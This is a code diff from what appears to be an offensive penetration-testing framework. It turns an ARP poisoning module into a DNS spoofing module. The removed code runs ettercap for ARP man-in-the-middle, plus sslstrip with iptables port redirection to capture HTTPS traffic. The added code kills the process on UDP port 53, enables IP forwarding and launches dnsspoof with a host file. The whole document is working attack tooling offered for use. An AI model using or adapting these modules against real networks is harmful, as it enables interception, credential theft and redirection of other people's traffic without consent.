@@ -14,11 +14,11 @@ import commands
 # INFORMATION MODULE
 def init():
 	init.Author             ="RedToor"
-	init.Version            ="3.1"
-	init.Description        ="ARP Poisoning"
-	init.CodeName           ="net/arp.pson"
-	init.DateCreation       ="26/08/2015"      
-	init.LastModification   ="27/07/2016"
+	init.Version            ="1.0"
+	init.Description        ="DNS Spoofing"
+	init.CodeName           ="net/dns.spoof"
+	init.DateCreation       ="29/07/2016"      
+	init.LastModification   ="29/07/2016"
 	init.References         =None
 	init.License            =KTF_LINCENSE
 	init.var                ={}
@@ -27,13 +27,12 @@ def init():
 	init.options = {
 		# NAME      VALUE               RQ     DESCRIPTION
 		'interface':[INTERFACE_ETHERNET,True ,'Interface'],
-		'target'   :["192.168.1.223"   ,True ,'Target IP'],
-		'gateway'  :[get_gateway()     ,True ,'Gateway IP'],
-		'https'    :[True              ,False,'HTTP/s Capture']
+		'hostfile' :["files/test/host" ,True ,'DNS\'s Spoofed File']
 	}
 
 	init.aux = """
  Devices Founds: """+str(get_interfaces())+"""
+ Functions     : to edit the DNS rules. 'x::nano """+init.options['hostfile'][0]+"""'
 	"""
 	return init
 # END INFORMATION MODULE
@@ -41,18 +40,16 @@ def init():
 # CODE MODULE    ############################################################################################
 def main(run):
 	if isConect() and checkDevice(init.var['interface']):
-		printAlert(0,"Starting ARP Poisoning [ettercap].")
+		Loadingfile(init.var['hostfile'])
+		open(init.var['hostfile'],'r')
+		printAlert(0,"Starting DNS spoofing [dnsspoof].")
 		commands.getoutput("iptables --flush -t nat")
-		Subprocess("ettercap -T -M ARP /"+init.var['target']+"// /"+init.var['gateway']+"// -i "+init.var['interface'])
-		if init.var['https']:
-			printAlert(0,"Starting SSL Capturing [sslstrip].")
-			commands.getoutput("sudo fuser -kuv 10000/tcp  >/dev/null 2>&1 ")
-			commands.getoutput("echo 1 > /proc/sys/net/ipv4/ip_forward")
-			commands.getoutput("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")
-			Subprocess("sslstrip")
-		raw_input(printAlert(8,"to Stop Attack ARP (PRESS ANY KEY)\n"))
-		commands.getoutput("killall ettercap")
-		commands.getoutput("killall sslstrip")
+		commands.getoutput("sudo fuser -kuv 53/udp  >/dev/null 2>&1 ")
+		commands.getoutput("echo 1 > /proc/sys/net/ipv4/ip_forward")
+		Subprocess("dnsspoof -i "+init.var['interface']+" -f "+init.var['hostfile'])
+		raw_input(printAlert(8,"to Stop DNS Spoof Attack (PRESS ANY KEY)\n"))
+		commands.getoutput("killall dnsspoof")
+		commands.getoutput("echo 0 > /proc/sys/net/ipv4/ip_forward")
 		commands.getoutput("iptables --flush -t nat")
 
 # END CODE MODULE ############################################################################################
